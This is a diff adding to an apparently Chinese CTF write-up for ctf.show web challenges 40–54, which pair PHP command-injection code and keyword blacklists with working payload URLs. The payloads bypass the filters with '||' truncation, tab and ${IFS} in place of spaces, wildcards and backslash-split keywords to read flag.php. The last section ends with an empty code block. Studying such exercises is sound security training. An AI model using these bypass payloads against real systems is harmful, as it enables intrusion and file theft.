@@ -9,7 +9,7 @@ description: >-
 
 ### 1.代码解释
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```php
 error_reporting(0);
@@ -633,3 +633,587 @@ if(isset($_GET['c'])){
 ```
 
 <figure><img src="../.gitbook/assets/image 29.png" alt=""><figcaption></figcaption></figure>
+
+很显然是个无参数读取文件，我们首先查看当前目录下的文件有哪些
+
+```php
+http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=print_r(scandir(pos(localeconv())));
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+可以看到我们要访问倒数第二个文件，所以我们接下来的代码是
+
+```php
+http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+得到flag。
+
+***
+
+
+
+## <mark style="color:blue;background-color:orange;">(13)Web 41</mark>
+
+不会，需要脚本，先跳过了。
+
+***
+
+
+
+## <mark style="color:blue;background-color:orange;">（14）Web 42</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 20:51:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    system($c." >/dev/null 2>&1");
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+要理解这段代码之前需要先了解一个I/O流的一个写法
+
+> `>/dev/null 2>&1`
+>
+> 这个命令是linux/unix里面i/o重定向的语句，他的作用就是把输出和错误信息都重定向到`/dev/null`，这样做的效果是将它们都丢弃，不会显示在终端上，也不会被保存到任何文件中。
+
+所以我们可以解释这段代码了。在system()函数执行$c变量的时候同时，将输出给丢弃掉，就是说我们如果直接这么执行是看不到回显的，所以我们需要截断后面这个。通过||只要前面成功了，后面就不执行了。
+
+```php
+http://e8adf119-3cce-41b7-a680-58eefc789d4d.challenge.ctf.show/?c=ls||
+```
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+```php
+http://e8adf119-3cce-41b7-a680-58eefc789d4d.challenge.ctf.show/?c=cat flag.php||
+```
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">（15）Web 43</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+就是和以前一样过滤，但是我们的||还能用，所以可以继续使用
+
+```php
+http://4dca9ec0-61b7-4341-9aa0-af0be0639a36.challenge.ctf.show/?c=more flag.php||
+```
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">（16）WEB 44</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:32:01
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/;|cat|flag/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+绕过过滤的方法前面都介绍过了这里就不赘叙了。后面也都不特意说了，大家自己看看wp就能明白
+
+```php
+http://188ca5a8-df45-49e3-9757-35702294688e.challenge.ctf.show/?c=more fla*||
+```
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+
+
+## <mark style="color:blue;background-color:orange;">（17）WEB45</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:35:34
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| /i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+```php
+http://5266b045-bb39-4219-a054-d84f6d4d907e.challenge.ctf.show/?c=more%09f*||
+```
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">（18）WEB46</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:50:19
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+```php
+http://9cecebfd-51c1-4c91-9150-bffa8238d816.challenge.ctf.show/?c=more%09fla?.php||
+```
+
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">(19)WEB47</mark>
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 21:59:23
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+```php
+http://26a6634b-a22b-4009-8819-254d74b86058.challenge.ctf.show/?c=nl%09fla?.php||
+```
+
+<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">(20)WEB48</mark>
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:06:20
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+```php
+http://68c081bd-8321-4230-8e52-2daffaae81f8.challenge.ctf.show/?c=nl%09fla?.php||
+```
+
+<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">（21）WEB49</mark>
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:22:43
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__); 
+```
+
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+
+
+{% hint style="danger" %}
+<mark style="color:red;">**在做这一题的时候出现了一个很重要的事情，就是<>/\</>和？一起使用时，不回显，所以我们将？换成/，让<>和/一起使用才能回显**</mark>
+{% endhint %}
+
+```php
+http://f9d6e425-e707-4e7e-a144-5bb5ed0f2630.challenge.ctf.show/?c=nl<>fla\g.php||
+```
+
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">（22）WEB50</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:32:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+```php
+http://b631725c-44f2-4cb6-a9e6-fc6d6fdf361a.challenge.ctf.show/?c=nl<>fla\g.php||
+```
+
+<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">（23）WEB 51</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:42:52
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+
+```
+http://8001153d-c69b-4aae-a44e-2bd8a5af2c4c.challenge.ctf.show/?c=nl<>fla\g.php||
+```
+
+<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">（24）WEB52</mark>
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-05 22:50:30
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c." >/dev/null 2>&1");
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+
+```php
+http://22058a52-1ccb-4cdd-b345-585108f54e44.challenge.ctf.show/?c=nl${IFS}fla\g.php||
+```
+
+<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">(25)WEB53</mark>
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 18:21:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
+        echo($c);
+        $d = system($c);
+        echo "<br>".$d;
+    }else{
+        echo 'no';
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+
+```php
+http://9230984a-f7d7-4a49-8d1d-63f9f28fa8c4.challenge.ctf.show/?c=nl${IFS}fla\g.php
+```
+
+<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## <mark style="color:blue;background-color:orange;">(26)WEB54</mark>
+
+```php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 19:43:42
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+} 
+```
+
+<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```php
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
